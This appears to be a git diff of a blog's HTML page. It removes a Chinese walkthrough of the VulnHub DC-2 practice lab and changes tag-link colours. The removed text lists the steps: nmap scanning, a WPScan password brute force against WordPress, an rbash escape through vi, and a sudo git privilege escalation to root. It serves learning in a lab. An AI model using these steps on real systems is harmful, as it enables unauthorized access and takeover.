@@ -215,176 +215,8 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <h1 id="DC-2靶场"><a href="#DC-2靶场" class="headerlink" title="DC-2靶场"></a>DC-2靶场</h1><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
-<li><p>kali虚拟机</p>
-</li>
-<li><p>DC-2靶场机</p>
-<pre><code>下载地址：https://www.vulnhub.com/entry/dc-2,311/
-</code></pre>
-</li>
-</ol>
-<p><strong><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103191925056.png" alt="image-20241103191925056"></strong></p>
-<h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><ol>
-<li><p>解压下载好的文件</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103191950866.png" alt="image-20241103191950866"></p>
-</li>
-<li><p>使用VM打开</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103192040498.png" alt="image-20241103192040498"></p>
-</li>
-<li><p>导入虚拟机</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103192126711.png" alt="image-20241103192126711"></p>
-</li>
-<li><p>开启，显示下述的内容即开启成功</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103192327686.png" alt="image-20241103192327686"></p>
-</li>
-<li><p>将kali的网络链接模式改为桥接模式</p>
-</li>
-</ol>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103192739929.png" alt="image-20241103192739929"></p>
-<h1 id="一、信息收集阶段"><a href="#一、信息收集阶段" class="headerlink" title="一、信息收集阶段"></a>一、信息收集阶段</h1><h2 id="1、探测目标主机IP地址"><a href="#1、探测目标主机IP地址" class="headerlink" title="1、探测目标主机IP地址"></a>1、探测目标主机IP地址</h2><p>​	打开kali，进入root模式，输入：</p>
-<pre><code>arp-scan -l
-</code></pre>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103193138237.png" alt="image-20241103193138237"></p>
-<p>​	查看一下我们DC-2靶场的IP地址</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103193349049.png" alt="image-20241103193349049"></p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103193527317.png" alt="image-20241103193527317"></p>
-<p>​	确定了DC主机IP地址是：</p>
-<pre><code>192.168.1.249
-</code></pre>
-<h2 id="2、全面检测目标IP"><a href="#2、全面检测目标IP" class="headerlink" title="2、全面检测目标IP"></a>2、全面检测目标IP</h2><p>​	输入命令：</p>
-<pre><code>nmap -A -p- 192.168.1.249
-</code></pre>
-<p>​	得到：</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103193844673.png" alt="image-20241103193844673"></p>
-<p>​	发现端口80是对外开放的</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103194026970.png" alt="image-20241103194026970"></p>
-<p>​	以及运行在7744端口的ssh服务</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103194113912.png" alt="image-20241103194113912"></p>
-<p>​	发现80端口不能正常访问，访问情况下直接跳转到了：</p>
-<pre><code>http://dc-2/
-</code></pre>
-<p>​	直接在kali的hoat文件中进行修改，把域名绑定成靶机的地址：</p>
-<pre><code>192.168.1.249
-</code></pre>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103195620188.png" alt="image-20241103195620188"></p>
-<p>​	访问之后</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103202133150.png" alt="image-20241103202133150"></p>
-<p>​	直接CMS识别一下，使用工具：CMSEEK</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103203021791.png" alt="image-20241103203021791"></p>
-<p>​	查看结果，直接探测出来了三个用户名</p>
-<p><strong><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103203458676.png" alt="image-20241103203458676"></strong></p>
-<h2 id="3、页面探测"><a href="#3、页面探测" class="headerlink" title="3、页面探测"></a>3、页面探测</h2><p>​	返回到主页面查看一下是否有其他信息，有个flag的选项，查看一下。发现提示</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103204419582.png" alt="image-20241103204419582"></p>
-<pre><code>Flag 1:
-Your usual wordlists probably won&#39;t work, so instead, maybe you justneed to be cewl.
-您通常的单词表可能不起作用，因此，也许您只需要成为cewl。
-More passwords is always better, but sometimes you just can&#39;t winthem all.
-更多的密码总是更好，但有时你无法赢得所有密码。
-Log in as one to see the next flag.
-以一个身份登录以查看下一个标志。
-If you can&#39;t find it, log in as another
-如果找不到，请以另一个身份登录。
-</code></pre>
-<p>​	提示使用使用工具cewl</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103205119814.png" alt="image-20241103205119814"></p>
-<h2 id="4-目录扫描"><a href="#4-目录扫描" class="headerlink" title="4.目录扫描"></a>4.目录扫描</h2><pre><code>dirsearch -u http://dc-2/ -e * -x 403 404
-</code></pre>
-<p>查看扫描结果，见名知意，找到一个登录页面</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103205513641.png" alt="image-20241103205513641"></p>
-<p>存在该页面</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103205637479.png" alt="image-20241103205637479"></p>
-<p>结合上面所得，大致要做的步骤如下：</p>
-<pre><code>1.结合所得用户名，使用工具cewl生成字典
-2.登录该页面，获取flag2
-</code></pre>
-<h1 id="二、渗透测试"><a href="#二、渗透测试" class="headerlink" title="二、渗透测试"></a>二、渗透测试</h1><h2 id="1-生成字典"><a href="#1-生成字典" class="headerlink" title="1.生成字典"></a>1.生成字典</h2><pre><code>cewl http://dc-2/ &gt; 1.txt
-</code></pre>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103210721630.png" alt="image-20241103210721630"></p>
-<h2 id="2-爆破账号密码"><a href="#2-爆破账号密码" class="headerlink" title="2.爆破账号密码"></a>2.爆破账号密码</h2><pre><code>wpscan --url http://dc-2 --passwords 1.txt
-</code></pre>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103211034303.png" alt="image-20241103211034303"></p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103211116401.png" alt="image-20241103211116401"></p>
-<p>​	两组都尝试一下</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103211218333.png" alt="image-20241103211218333"></p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103211316726.png" alt="image-20241103211316726"></p>
-<p>​	使用jerry账号找到flag2</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103211453010.png" alt="image-20241103211453010"></p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103211524260.png" alt="image-20241103211524260"></p>
-<pre><code>Flag 2:
-If you can&#39;t exploit WordPress and take a shortcut, there is another way.
-Hope you found another entry point.
-
-标记 2:
-如果你不能利用WordPress并走捷径，还有另一种方法。
-希望你找到了另一个入口点。
-</code></pre>
-<h1 id="三、主机端渗透"><a href="#三、主机端渗透" class="headerlink" title="三、主机端渗透"></a>三、主机端渗透</h1><h2 id="1-ssh登录"><a href="#1-ssh登录" class="headerlink" title="1.ssh登录"></a>1.ssh登录</h2><p>​	不能直接拿到shell，那就试一试ssh。</p>
-<p>​	最一开始拿到的端口除了80还有一个7744，这个是ssh的，80没有东西了，试一试7744.</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103212135060.png" alt="image-20241103212135060"></p>
-<p>​	发现jerry这个账号密码无法识别，那就试一下tom的账号</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103212255336.png" alt="image-20241103212255336"></p>
-<p>​	成功进入，先看一下权限<img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103212333848.png" alt="image-20241103212333848"></p>
-<p>​	是一个低权限用户</p>
-<h2 id="1-rbash逃逸"><a href="#1-rbash逃逸" class="headerlink" title="1.rbash逃逸"></a>1.rbash逃逸</h2><p>​	低权限，有rbash限制，那就rbash逃逸（Linux提权的一种）</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103212702367.png" alt="image-20241103212702367"></p>
-<h2 id="2-使用vi设置shell"><a href="#2-使用vi设置shell" class="headerlink" title="2.使用vi设置shell"></a>2.使用vi设置shell</h2><pre><code>vi
-
-:set shell=/bin/bash
-
-:shell
-</code></pre>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103212904412.png" alt="image-20241103212904412"></p>
-<p>​	cat尝试一下，发现vi编辑器成功。</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103213041615.png" alt="image-20241103213041615"></p>
-<p>​	添加路径</p>
-<pre><code>export PATH=$PATH:/usr/bin/
-export PATH=$PATH:/bin/
-</code></pre>
-<p>​	<img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103213235743.png" alt="image-20241103213235743"></p>
-<p>​	我们的目的——拿到flag3</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103213326609.png" alt="image-20241103213326609"></p>
-<pre><code>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
-</code></pre>
-<h2 id="3-切换用户"><a href="#3-切换用户" class="headerlink" title="3.切换用户"></a>3.切换用户</h2><pre><code>su jerry
-</code></pre>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103213555239.png" alt="image-20241103213555239"></p>
-<p>​	找flag</p>
-<pre><code>find / -name *flag*
-</code></pre>
-<p><strong><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103213635579.png" alt="image-20241103213635579"></strong></p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103213721651.png" alt="image-20241103213721651"></p>
-<pre><code>cat /home/jerry/flag4.txt
-</code></pre>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103213739298.png" alt="image-20241103213739298"></p>
-<pre><code>Good to see that you&#39;ve made it this far - but you&#39;re not home yet. 
-
-You still need to get the final flag (the only flag that really counts!!!).  
-
-No hints here - you&#39;re on your own now.  :-)
-
-Go on - git outta here!!!!
-</code></pre>
-<h2 id="4-git提权"><a href="#4-git提权" class="headerlink" title="4.git提权"></a>4.git提权</h2><p>​	提示是git，那就尝试一下</p>
-<pre><code>sudo -l
-</code></pre>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103213858766.png" alt="image-20241103213858766"></p>
-<p>​	提权姿势</p>
-<pre><code>sudo git help config
-
-!/bin/bash
-</code></pre>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103213939833.png" alt="image-20241103213939833"></p>
-<p>​	提权成功</p>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103214029745.png" alt="image-20241103214029745"></p>
-<h2 id="5-找目标"><a href="#5-找目标" class="headerlink" title="5.找目标"></a>5.找目标</h2><pre><code>find / -name *flag*
-</code></pre>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103214128187.png" alt="image-20241103214128187"></p>
-<p>​	打开看一下</p>
-<pre><code>cat /root/final*
-</code></pre>
-<p><img src="http://typora2023-11.oss-cn-beijing.aliyuncs.com/img/image-20241103214149250.png" alt="image-20241103214149250"></p>
-<p>​	拿到flag！</p>
-
+            <h1 id="DC-2靶场"><a href="#DC-2靶场" class="headerlink" title="DC-2靶场"></a>DC-2靶场</h1><p>DC-2靶场</p>
+<hr>
             
         </div>
     </div>
@@ -398,7 +230,7 @@ Go on - git outta here!!!!
         
         <span class="tag">
             
-            <a href="/tags/DC/" style="color: #ffa2c4">DC</a>
+            <a href="/tags/DC/" style="color: #00bcd4">DC</a>
         </span>
         
     </div>
@@ -446,7 +278,7 @@ Go on - git outta here!!!!
         
         <span class="tag">
             
-            <a href="/tags/python%E9%A1%B9%E7%9B%AE/" style="color: #00bcd4">python项目</a>
+            <a href="/tags/python%E9%A1%B9%E7%9B%AE/" style="color: #03a9f4">python项目</a>
         </span>
         
     </div>
@@ -494,7 +326,7 @@ Go on - git outta here!!!!
         
         <span class="tag">
             
-            <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="color: #03a9f4">计算机网络</a>
+            <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="color: #00bcd4">计算机网络</a>
         </span>
         
     </div>
@@ -593,7 +425,7 @@ Go on - git outta here!!!!
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #ff7d73">python</a>
+            <a href="/tags/python/" style="color: #00bcd4">python</a>
         </span>
         
     </div>
@@ -645,7 +477,7 @@ Go on - git outta here!!!!
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #ff7d73">python</a>
+            <a href="/tags/python/" style="color: #ffa2c4">python</a>
         </span>
         
     </div>
@@ -696,7 +528,7 @@ Go on - git outta here!!!!
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #03a9f4">python</a>
+            <a href="/tags/python/" style="color: #00bcd4">python</a>
         </span>
         
     </div>
@@ -747,7 +579,7 @@ Go on - git outta here!!!!
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #00bcd4">python</a>
+            <a href="/tags/python/" style="color: #ff7d73">python</a>
         </span>
         
     </div>
@@ -799,7 +631,7 @@ Go on - git outta here!!!!
         
         <span class="tag">
             
-            <a href="/tags/jsp/" style="color: #00bcd4">jsp</a>
+            <a href="/tags/jsp/" style="color: #00a596">jsp</a>
         </span>
         
     </div>
@@ -850,7 +682,7 @@ Go on - git outta here!!!!
         
         <span class="tag">
             
-            <a href="/tags/jsp/" style="color: #ffa2c4">jsp</a>
+            <a href="/tags/jsp/" style="color: #ff7d73">jsp</a>
         </span>
         
     </div>
